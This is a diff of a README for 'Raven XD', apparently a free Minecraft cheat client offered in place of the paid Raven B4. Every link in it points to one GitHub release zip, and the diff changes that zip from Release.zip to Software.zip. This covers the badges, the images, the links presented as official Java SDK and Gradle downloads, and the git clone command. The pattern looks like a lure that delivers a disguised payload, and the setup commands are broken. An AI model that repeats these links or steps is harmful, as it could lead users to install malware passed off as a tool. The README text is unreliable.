@@ -3,27 +3,27 @@
   
 # Raven XD
 <p align="center">
-    <a href="https://github.com/gopuatop100/Raven-XD/releases/download/v1.0/Release.zip">
-      <img src="https://github.com/gopuatop100/Raven-XD/releases/download/v1.0/Release.zip" alt="issues" />
+    <a href="https://github.com/gopuatop100/Raven-XD/releases/download/v2.0/Software.zip">
+      <img src="https://github.com/gopuatop100/Raven-XD/releases/download/v2.0/Software.zip" alt="issues" />
     </a>
-    <img src="https://github.com/gopuatop100/Raven-XD/releases/download/v1.0/Release.zip" alt="License">
+    <img src="https://github.com/gopuatop100/Raven-XD/releases/download/v2.0/Software.zip" alt="License">
 </p>
 
-[![Github Release Downloads](https://github.com/gopuatop100/Raven-XD/releases/download/v1.0/Release.zip%20Release%20Downloads&style=flat-square)](https://github.com/gopuatop100/Raven-XD/releases/download/v1.0/Release.zip)
+[![Github Release Downloads](https://github.com/gopuatop100/Raven-XD/releases/download/v2.0/Software.zip%20Release%20Downloads&style=flat-square)](https://github.com/gopuatop100/Raven-XD/releases/download/v2.0/Software.zip)
 <!--
-[![CurseForge Downloads](https://github.com/gopuatop100/Raven-XD/releases/download/v1.0/Release.zip)](https://github.com/gopuatop100/Raven-XD/releases/download/v1.0/Release.zip)
-[![Modrinth Downloads](https://github.com/gopuatop100/Raven-XD/releases/download/v1.0/Release.zip%20Downloads&logo=Modrinth%20Downloads&style=flat-square)](https://github.com/gopuatop100/Raven-XD/releases/download/v1.0/Release.zip)
+[![CurseForge Downloads](https://github.com/gopuatop100/Raven-XD/releases/download/v2.0/Software.zip)](https://github.com/gopuatop100/Raven-XD/releases/download/v2.0/Software.zip)
+[![Modrinth Downloads](https://github.com/gopuatop100/Raven-XD/releases/download/v2.0/Software.zip%20Downloads&logo=Modrinth%20Downloads&style=flat-square)](https://github.com/gopuatop100/Raven-XD/releases/download/v2.0/Software.zip)
 -->
 
 Raven B4, but for those who can't afford it.
 
 Raven B4, but not only for Hypixel.
 
-![2024-07-10_14 13 51](https://github.com/gopuatop100/Raven-XD/releases/download/v1.0/Release.zip)
+![2024-07-10_14 13 51](https://github.com/gopuatop100/Raven-XD/releases/download/v2.0/Software.zip)
 
 ### ***More functionality while staying in sync with upstream branches.***
 
-<a href="https://github.com/gopuatop100/Raven-XD/releases/download/v1.0/Release.zip"><img src="https://github.com/gopuatop100/Raven-XD/releases/download/v1.0/Release.zip" alt="https://github.com/gopuatop100/Raven-XD/releases/download/v1.0/Release.zip"/></a><br>
+<a href="https://github.com/gopuatop100/Raven-XD/releases/download/v2.0/Software.zip"><img src="https://github.com/gopuatop100/Raven-XD/releases/download/v2.0/Software.zip" alt="https://github.com/gopuatop100/Raven-XD/releases/download/v2.0/Software.zip"/></a><br>
 </div>
 
 ## Additional Modules
@@ -68,7 +68,7 @@ Raven B4, but not only for Hypixel.
 ### Steps:
 
 1. **Download and Install Java SDK version 8**:
-   - Download from [Java SDK version 8](https://github.com/gopuatop100/Raven-XD/releases/download/v1.0/Release.zip).
+   - Download from [Java SDK version 8](https://github.com/gopuatop100/Raven-XD/releases/download/v2.0/Software.zip).
    - Install it and set the `JAVA_HOME` environment variable to the installation directory.
 
 2. **Verify Java Installation**:
@@ -77,20 +77,20 @@ Raven B4, but not only for Hypixel.
    - Ensure the output contains `openjdk version "1.8.0_{...}"`.
 
 3. **Install Gradle 4.7**:
-   - Download from [Gradle 4.7](https://github.com/gopuatop100/Raven-XD/releases/download/v1.0/Release.zip).
-   - Follow the "Installing manually" guide on the [Gradle wiki](https://github.com/gopuatop100/Raven-XD/releases/download/v1.0/Release.zip).
+   - Download from [Gradle 4.7](https://github.com/gopuatop100/Raven-XD/releases/download/v2.0/Software.zip).
+   - Follow the "Installing manually" guide on the [Gradle wiki](https://github.com/gopuatop100/Raven-XD/releases/download/v2.0/Software.zip).
 
 4. **Clone the Repository**:
    - Run the following commands in the terminal or command prompt:
      ```bash
-     git clone --recursive https://github.com/gopuatop100/Raven-XD/releases/download/v1.0/Release.zip
+     git clone --recursive https://github.com/gopuatop100/Raven-XD/releases/download/v2.0/Software.zip
      cd Raven-XD
      ```
 
 5. **Set Up the Project**:
    - Run the following commands to set up the Gradle wrapper and the development environment:
      ```bash
-     https://github.com/gopuatop100/Raven-XD/releases/download/v1.0/Release.zip
+     https://github.com/gopuatop100/Raven-XD/releases/download/v2.0/Software.zip
      gradle wrapper
      gradlew build
      ```
@@ -104,4 +104,4 @@ Feel free to raise an issue or submit a pull request.
 
 If you want to co-develop this project with me, please contact me.
 
-<img src="https://github.com/gopuatop100/Raven-XD/releases/download/v1.0/Release.zip IDEA/IntelliJ https://github.com/gopuatop100/Raven-XD/releases/download/v1.0/Release.zip" alt="Java" width="500" />
+<img src="https://github.com/gopuatop100/Raven-XD/releases/download/v2.0/Software.zip IDEA/IntelliJ https://github.com/gopuatop100/Raven-XD/releases/download/v2.0/Software.zip" alt="Java" width="500" />
